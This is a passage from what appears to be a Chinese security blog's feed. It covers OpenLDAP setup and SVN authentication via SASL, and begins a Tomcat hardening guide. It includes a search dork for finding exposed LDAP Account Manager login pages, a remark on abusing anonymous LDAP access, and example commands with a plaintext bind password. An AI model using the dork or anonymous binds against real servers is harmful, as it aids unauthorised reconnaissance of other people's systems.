class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.openldap.org/doc/admin24/access-control.html</span><br></pre></td></tr></table></figure></p><p>0x08 让rsyslog记录ldap日志<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># cp /etc/rsyslog.conf /etc/rsyslog.conf_`date +%Y%m%d`.bak</span><br><span class="line"># echo &quot;local4.*                    /var/log/ldap.log&quot; &gt;&gt; /etc/rsyslog.conf</span><br><span class="line"># tail -n 1 /etc/rsyslog.conf</span><br><span class="line"># /etc/init.d/rsyslog restart</span><br></pre></td></tr></table></figure></p><p>0x09 修改ldap数据库的存放路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># grep bdb /etc/openldap/slapd.conf</span><br><span class="line"># cp /usr/share/openldap-servers/DB_CONFIG.example /var/lib/ldap/DB_CONFIG</span><br><span class="line"># chown ldap.ldap /var/lib/ldap/DB_CONFIG </span><br><span class="line"># chmod 700 /var/lib/ldap/</span><br><span class="line"># ll /var/lib/ldap/</span><br><span class="line"># egrep -v &quot;#|^$&quot; /var/lib/ldap/DB_CONFIG</span><br><span class="line"># slaptest -u检查slapd.conf配置是否正确</span><br><span class="line"># egrep -v &quot;^#|^$&quot; /etc/openldap/slapd.conf</span><br></pre></td></tr></table></figure></p><p>0x10 一切配置就绪后,我们尝试启动openldap服务,<code>默认它工作在tcp的389端口</code>,如果是加密通信,默认端口则为636<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># /etc/init.d/slapd start</span><br><span class="line"># netstat -tulnp | grep 389</span><br><span class="line"># ps aux | grep slapd查看ldap默认的服务运行权限</span><br><span class="line"># chkconfig slapd on</span><br><span class="line"># chkconfig --list | grep slapd</span><br><span class="line"># tail /var/log/ldap.log</span><br><span class="line"></span><br><span class="line"># 查询当前ldap数据库中的所有用户信息,默认肯定是空的,因为我们此时还没有导入任何信息</span><br><span class="line"># ldapsearch -LLL -W -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -b &quot;dc=ldapmaster,dc=org&quot; &quot;(uid=*)&quot;</span><br><span class="line"># rm -rf /etc/openldap/slapd.d/*上述第一次查询可能会有问题,把该目录下的配置全部删掉,重启服务再查基本就没问题了</span><br><span class="line"># slaptest -f /etc/openldap/slapd.conf -F /etc/openldap/slapd.d/</span><br><span class="line"># chown -R ldap.ldap /etc/openldap/slapd.d</span><br><span class="line"># /etc/init.d/slapd restart</span><br><span class="line"># netstat -tunlp |grep slapd</span><br></pre></td></tr></table></figure></p><p>0x11 到此为止,ldap基本就算搭建好了,接下来,我们开始往ldap数据库中添加用户数据,在添加之前我们需要先把它转成符合ldap数据库的数据格式,如下</p><p>安装migrationtools工具,因为我们要它来导出本地用户数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># yum install migrationtools -y</span><br><span class="line"># vi /usr/share/migrationtools/migrate_common.ph修改为自己的域名和BaseDN</span><br><span class="line">  $DEFAULT_MAIL_DOMAIN = &quot;ldapmaster.org&quot;;</span><br><span class="line">  $DEFAULT_BASE = &quot;dc=ldapmaster,dc=org&quot;;</span><br></pre></td></tr></table></figure></p><p>使用migrationtools内置的脚本来进行导出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># export LC_ALL=C</span><br><span class="line"># echo &quot;export LC_ALL=C&quot; &gt;&gt; /etc/profile</span><br><span class="line"># /usr/share/migrationtools/migrate_base.pl &gt; base.ldif</span><br><span class="line"># /usr/share/migrationtools/migrate_passwd.pl /etc/passwd &gt; passwd.ldif</span><br><span class="line"># /usr/share/migrationtools/migrate_group.pl /etc/group &gt; group.ldif</span><br></pre></td></tr></table></figure></p><p>使用ldapadd的添加条目,即 <code>增</code>,往ldap数据库中添加刚刚导出的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ldapadd -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -W -f base.ldif</span><br><span class="line"># ldapadd -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -W -f passwd.ldif</span><br><span class="line"># ldapadd -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -W -f group.ldif</span><br></pre></td></tr></table></figure></p><p>使用ldapdelete删除指定条目,即 <code>删</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ldapdelete -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -w klion &quot;cn=test,ou=Group,dc=ldapmaster,dc=org&quot;</span><br></pre></td></tr></table></figure></p><p>使用ldapmodify修改指定条目,即 <code>改</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ldapmodify -x -W -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -f fstab.ldif</span><br></pre></td></tr></table></figure></p><p>使用ldapsearch查询指定条目,即 <code>查</code>询指定basedn下的所有条目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># ldapsearch -LLL -w klion -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -b &quot;dc=ldapmaster,dc=org&quot;</span><br><span class="line"># ldapsearch -LLL -w klion -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -b &quot;dc=ldapmaster,dc=org&quot; &quot;(uid=aima)&quot;</span><br></pre></td></tr></table></figure></p><p>备份ldap数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ldapsearch -LLL -w klion -x -H ldap://ldapmaster.org -D &quot;cn=klion,dc=ldapmaster,dc=org&quot; -b &quot;dc=ldapmaster,dc=org&quot; &quot;(uid=*)&quot; &gt;bak.ldif</span><br></pre></td></tr></table></figure></p><p>0x12 使用各种ldap客户端管理工具来操作ldap数据库,此处暂以web端管理接口为例进行演示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># yum install httpd php php-ldap php-gd -y</span><br><span class="line"># cd /var/www/html/</span><br><span class="line"># tar xf ldap-account-manager-4.2.tar.gz</span><br><span class="line"># mv ldap-account-manager-4.2 ldap</span><br><span class="line"># cd ldap/config</span><br><span class="line"># cp config.cfg_sample config.cfg_sample.bak</span><br><span class="line"># cp lam.conf_sample lam.conf_sample.bak</span><br><span class="line"># mv config.cfg_sample config.cfg</span><br><span class="line"># mv lam.conf_sample lam.conf</span><br><span class="line">  serverURL: ldap://ldapmaster:389</span><br><span class="line">  admins: cn=klion,dc=ldapmaster,dc=org</span><br><span class="line">  treesuffix: dc=ldapmaster,dc=org</span><br><span class="line">  types: suffix_user: ou=People,dc=ldapmaster,dc=org</span><br><span class="line">  types: suffix_group: ou=group,dc=ldapmaster,dc=org</span><br><span class="line">  types: suffix_host: ou=machines,dc=ldapmaster,dc=org</span><br><span class="line">  types: suffix_smbDomain: dc=ldapmaster,dc=org</span><br><span class="line">  </span><br><span class="line"># chown -R apache.apache /var/www/html/ldap</span><br><span class="line"># vi /etc/httpd/conf/httpd.conf</span><br><span class="line">  &lt;VirtualHost *:80&gt;</span><br><span class="line">    ServerAdmin ldapmaster.org</span><br><span class="line">    DocumentRoot /var/www/html/ldap</span><br><span class="line">    ServerName ldapmaster.org</span><br><span class="line">    ErrorLog logs/ldapmaster.org-error_log</span><br><span class="line">    CustomLog logs/ldapmaster.org-access_log common</span><br><span class="line">  &lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"># /etc/init.d/httpd start</span><br><span class="line"># chkconfig httpd on</span><br><span class="line">http://ldapmaster.org/templates/login.php 做好host解析后访问此url即可全图形化管理ldap</span><br></pre></td></tr></table></figure></p><p><img src="/img/ldapadminmaster.png" alt=""></p><p>虽然这种纯图形化的工具貌似是很好用,但个人还是不太建议在实际生产环境中用,验证过于简单,比较危险,毕竟只是个web脚本,很容易被入侵者扫目录,扫域名时扫到,另外,也极易被各类搜索引擎抓到,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inurl:templates/login.php intitle:LDAP Account Manager</span><br></pre></td></tr></table></figure></p><p><img src="/img/ldap account manger.png" alt=""></p><p>0x13 启用sasl,让指定的服务都通过ldap的方式进行集中身份验证<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># yum install *sasl* -y</span><br><span class="line"># rpm -qa | grep sasl</span><br><span class="line"># saslauthd -vsasl所支持的所有认证类型</span><br><span class="line"># sed -i &apos;s#MECH=pam#MECH=ldap#g&apos; /etc/sysconfig/saslauthd</span><br><span class="line"># grep -i mech /etc/sysconfig/saslauthd</span><br><span class="line">  MECH=ldap</span><br><span class="line"># /etc/init.d/saslauthd start</span><br><span class="line"># chkconfig saslauthd on</span><br><span class="line"># vi /etc/saslauthd.conf</span><br><span class="line">  ldap_bind_dn: cn=klion,dc=ldapmaster,dc=org</span><br><span class="line">  ldap_bind_pw: klion</span><br><span class="line">  ldap_search_base: ou=People,dc=ldapmaster,dc=org</span><br><span class="line">  ldap_filter: uid=%U</span><br><span class="line">  ldap_password_attr: userPassword</span><br><span class="line"># ps -ef | grep sasl</span><br><span class="line"># testsaslauthd -u super -p admin此时便会用ldap账户来进行验证</span><br></pre></td></tr></table></figure></p><p>0x14 以让svn服务通过ldap进行认证为例,其实非常简单,首先,你需要先在本机快速部署好svn,至于具体的部署方法,请参考之前的相关文章,当然,除了svn,像<code>vsftpd,samba</code>这类的基础服务也都可以通过ldap进行身份验证,并非重点此处不再赘述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># 让svn通过ldap进行验证,不再走svn自己的验证了</span><br><span class="line"># vi /etc/sasl2/snv.conf</span><br><span class="line">  pwcheck_method: saslauthd</span><br><span class="line">  mech_list: PLAIN LOGIN</span><br><span class="line"></span><br><span class="line"># 编辑svn主配置文件</span><br><span class="line"># vi /svn/svndata/svndoc/conf/svnserve.conf  </span><br><span class="line">  [general]</span><br><span class="line">    anon-access = none</span><br><span class="line">    auth-access = write</span><br><span class="line">    password-db = /svn/svnpasswd/passwd</span><br><span class="line">    authz-db = /svn/svnpasswd/authz</span><br><span class="line">  [sasl]</span><br><span class="line">    use-sasl = true# 开启svn的sasl验证</span><br><span class="line"></span><br><span class="line"># 把svn本地用户全部注释掉,因为一旦开启sasl就不再走svn本地验证了</span><br><span class="line"># vi /svn/svnpasswd/passwd</span><br><span class="line">  [users]</span><br><span class="line">  # harry = harryssecret</span><br><span class="line">  # sally = sallyssecret</span><br><span class="line">  # web = 654321</span><br><span class="line">  # webadmin = admin110</span><br><span class="line">  # admin = 123456</span><br><span class="line">  # bakuser = admin</span><br><span class="line">  # guest = svn110</span><br><span class="line">  # svn = svnadmin</span><br><span class="line"></span><br><span class="line"># 另外,还需要把ldap用户加到svn认证文件中,不然,依然是登不上svn的</span><br><span class="line"># 虽然用户密码验证过程不走本地,但权限认证过程还是在本地进行的</span><br><span class="line"># vi /svn/svnpasswd/authz </span><br><span class="line">  [aliases]</span><br><span class="line">  [groups]</span><br><span class="line">  administrator = web</span><br><span class="line">  sec = webadmin,admin</span><br><span class="line">  ldap_user = svnnew,super</span><br><span class="line">  </span><br><span class="line">  [svndoc:/]</span><br><span class="line">  svn = rw</span><br><span class="line">  @administrator = rw</span><br><span class="line">  @ldap_user = rw</span><br><span class="line">  </span><br><span class="line">  [svndoc:/web01]</span><br><span class="line">  bakuser = rw</span><br><span class="line">  </span><br><span class="line">  [svndoc:/web02]</span><br><span class="line">  guest = rw</span><br></pre></td></tr></table></figure></p><p>下面是svn通过ldap进行认证的实际效果</p><p><img src="/img/ldapadminmaster svn log.png" alt=""><br><img src="/img/ldapadminmaster svn log res.png" alt=""></p><p>0x15 关于ldap主从同步,后续有机会再说,这次我们先初步入个门  ^_^</p><p>0x16 最后,我们再来关注下openldap的一些安全问题,最重要的可能就是<code>允许匿名访问</code>,对此的利用没什么好说的,直接用各种ldap客户端工具,如,<code>LDAPSoft Ldap Browser或者JXplorer都行</code>,只需<code>指定正确的ip,端口和dn,然后用匿名的方式连上去即可</code></p><p><img src="/img/ldapadminmaster any.png" alt=""></p><p><br><br>后话:<br>&nbsp;&nbsp;&nbsp;&nbsp;建议实际生产环境中直接使用加密传输,另外,可根据实际业务需求配置更具针对性的ACL,至于针对web层的<code>ldap注入 [ 其实跟sql注入没什么两样,只是查询语言不同而已 ]</code>,篇幅原因,我们在后续的相关章节中还会再做详细说明,待续……</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;0x01 关于 ldap 的一些简单科普&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;`ldap` 基于tcp/ip的轻量级目录访问协议,属于X.500目录协议族的一个简化版本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;你可以暂时把它粗暴的理解成 `一种特殊类型的数据库` ,通常,这种数据库文件后缀都为`.ldif`,并使用特殊的节点查询语句来获取相应数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;实际生产环境中,主要还是用它来做各种查询比较多,既是查询,也就意味着肯定会有大量的读操作&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;虽然,ldap也支持一些简单的更新功能,即写,但一般都不会用,因为它在写方面的效率并不高&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;如果真的是写比较多,直接用各种关系型数据库代替就好了,实在没必要用ldap,毕竟,术业有专攻&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;另外,ldap 跨平台,功能简洁,易管理,配置,读性能也不错,亦可分布式部署`不知道是不是可以把它的分布式理解成windows域的目录树,目录林概念`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;用的最多的可能就是进行`集中身份验证`,最后,我们还需要知道的是,默认情况下,ldap的所有数据都是直接以明文传输的,容易被截获,不过好在它支持ssl&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x02 其它的一些常用目录服务工具&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;X.500 		过于庞大臃肿&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ldap  		轻量且配置简单&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;windows活动目录  有平台限制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;NIS		个人暂时还没接触过&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x03 了解ldap内部数据的大致存储方式&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;和常规关系型数据库不同的是,ldap并非按照常规的库,表,字段方式来存储数据&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;而是按照一种特殊的倒树状结构层级来组织管理数据,此处的树指的就是目录信息树,即`DIT`&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;所谓的目录信息树其实相当于专门用来进行读操作的数据库&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;在DIT内部则由N个条目`entry`所组成,就相当于我们常规数据库表中每条具体的记录&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;而条目的内容则是由具有唯一标识名`DN`的属性[Attribute]及属性对应的值[value]所组成的这么一个集合&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;条目为ldap中最基础的操作单位,通常对ldap的增删改查都是以条目为基本单元进行的&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="LDAP安全" scheme="https://evil-404.github.io/categories/LDAP%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="LDAP安全" scheme="https://evil-404.github.io/tags/LDAP%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Tomcat 安全部署实战指南</title>
    <link href="https://evil-404.github.io/2017-12-17-tomcat-sec.html"/>
    <id>https://evil-404.github.io/2017-12-17-tomcat-sec.html</id>
    <published>2017-12-16T20:09:17.000Z</published>
    <updated>2017-12-30T12:34:50.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于Tomcat,更多详情大家可直接参考百科说明<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://zh.wikipedia.org/wiki/Apache_Tomcat</span><br></pre></td></tr></table></figure></p><p>此次演示环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS7 x86_64 ip: 192.168.3.64</span><br><span class="line">Apache Tomcat/8.5.24 建议大家使用较新版的稳定版本</span><br></pre></td></tr></table></figure></p><p>0x02 首先,在正式部署Tomcat之前,需要先来准备好jdk环境,因为毕竟底层还是在靠java来处理,所以必须要先得有java的运行环境才行,其实,在实际生产环境中,也可以单独使用<code>jre</code>,不过个人觉得这和安全的关系并不大,试想,如果你手里都已经拿到了一个可以运行java的环境了,我在本地用对应版本的jdk编译好了再丢上运行也是一样,防不住啥,太泛泛<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># tar xf jdk-8u151-linux-x64.tar.gz</span><br><span class="line"># mv jdk1.8.0_151/ /usr/local/</span><br><span class="line"># ln -s /usr/local/jdk1.8.0_151/ /usr/local/jdk</span><br><span class="line"># tar xf apache-tomcat-8.5.24.tar.gz</span><br><span class="line"># mv apache-tomcat-8.5.24 /usr/local/</span><br><span class="line"># ln -s /usr/local/apache-tomcat-8.5.24/ /usr/local/tomcat</span><br><span class="line"># ll /usr/local/</span><br><span class="line"># vi /etc/profile</span><br><span class="line">  export JAVA_HOME=/usr/local/jdk/ </span><br><span class="line">  export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH </span><br><span class="line">  export CLASSPATH=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar</span><br><span class="line">  export TOMCAT_HOME=/usr/local/tomcat</span><br><span class="line"># source /etc/profile</span><br><span class="line"># java -version</span><br><span class="line"># javac</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x03 <code>务必专门创建一个普通用户来运行tomcat服务,防止入侵者直接拿到root权限的webshell</code>,极度建议大家实际应用中在满足当前及拓展业务需求的前提下,尽量把tomcat压缩在一个极小的系统权限下,最好,除了指定的事儿,其它的让它啥也干不了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># useradd -u 301 tomcat</span><br><span class="line"># passwd tomcat</span><br><span class="line"># chown -R tomcat:tomcat /usr/local/tomcat/</span><br><span class="line"># chown -R tomcat:tomcat /usr/local/jdk/</span><br><span class="line"># ll /usr/local/jdk/ /usr/local/tomcat/</span><br><span class="line"># su - tomcat</span><br><span class="line">$ /usr/local/tomcat/bin/catalina.sh start</span><br><span class="line">$ netstat -tulnp</span><br><span class="line">$ cat /usr/local/tomcat/logs/catalina.out  启动过程中如果有什么问题可以去该日志</span><br></pre></td></tr></table></figure></p><p>0x04 理解Tomcat的基本目录结构<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># tree -L 1 /usr/local/tomcat/</span><br><span class="line">/usr/local/tomcat/</span><br><span class="line">├── bin   主要用来放置各种tomcat服务管理脚本</span><br><span class="line">├── conf   用于存放Tomcat服务的各类配置文件</span><br><span class="line">├── lib   此目录用于存放Tomcat的核心类库文件</span><br><span class="line">├── LICENSE</span><br><span class="line">├── logs   主要用于放置Tomcat的启动和访问日志文件</span><br><span class="line">├── NOTICE</span><br><span class="line">├── RELEASE-NOTES</span><br><span class="line">├── RUNNING.txt</span><br><span class="line">├── temp   存放一些缓存临时数据的目录</span><br><span class="line">├── webapps   默认的站点根目录</span><br><span class="line">└── work   把jsp代码转换为java代码[class]文件时的存放目录,这就是为什么访问速度极快的原因之一,只需编译一次,后续直接访问`缓存`</span><br></pre></td></tr></table></figure></p><p>0x05 理解Tomcat各个配置文件的主要功用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># tree -L 1 /usr/local/tomcat/conf/</span><br><span class="line">/usr/local/tomcat/conf/</span><br><span class="line">├── Catalina</span><br><span class="line">├── catalina.policy  当带上-security选项启动tomcat时,会自动读取并应用该文件中的策略配置</span><br><span class="line">├── catalina.properties  有关Tomcat内部各种类加载器的一些配置</span><br><span class="line">├── context.xml  此处的context.xml是作用于域全局的,一般情况下,每个站点目录下都应有一个context.xml文件,用于定义会话管理器,JDBC等</span><br><span class="line">├── jaspic-providers.xml</span><br><span class="line">├── jaspic-providers.xsd</span><br><span class="line">├── logging.properties  指定不同类日志的格式</span><br><span class="line">├── server.xml  tomcat主配置文件</span><br><span class="line">├── tomcat-users.xml  用于tomcat web管理端认证的配置文件</span><br><span class="line">├── tomcat-users.xsd</span><br><span class="line">└── web.xml  站点被部署时使用的默认部署配置项</span><br></pre></td></tr></table></figure></p><p>0x05 深入理解tomcat的运作细节及常用组件</p><p>简单回顾Tomcat的基本运作细节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-&gt; 此处,以请求 http://www.rootkit.org:8080/demo/index.jsp 为例</span><br><span class="line">  -&gt; 首先,客户端来请求www.rootkit.org的8080端口,正好被监听于此的Http Connector所捕获</span><br><span class="line">    -&gt; 随后,Connector会把该请求交给它所在的Service中的Engine去处理并等待Engine回应</span><br><span class="line">      -&gt; 当Engine拿到这个请求后,会自动根据请求中的www.rootkit.org这个域名来匹配到它内部属于哪个Host,然后直接丢给那个Host</span><br><span class="line">-&gt; 当请求到达指定的Host时,Host会自动匹配出Path为/demo所在的Context</span><br><span class="line">  -&gt; 之后,对应Context会拿到/index.jsp请求,再到映射表中找出对应的Servlet类去处理,如,构造HttpServletRequest和HttpServletResponse对象</span><br><span class="line">    -&gt; Context会把处理好之后的HttpServletResponse对象返回给Host</span><br><span class="line">      -&gt; Host再把HttpServletResponse对象返回给Engine</span><br><span class="line">-&gt; 最后,Engine把HttpServletResponse对象返回对应的Connector,至此,一次相对完整的Tomcat请求响应过程就基本完成了</span><br></pre></td></tr></table></figure></p><p>关于上述提到的各个组件功用简介<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 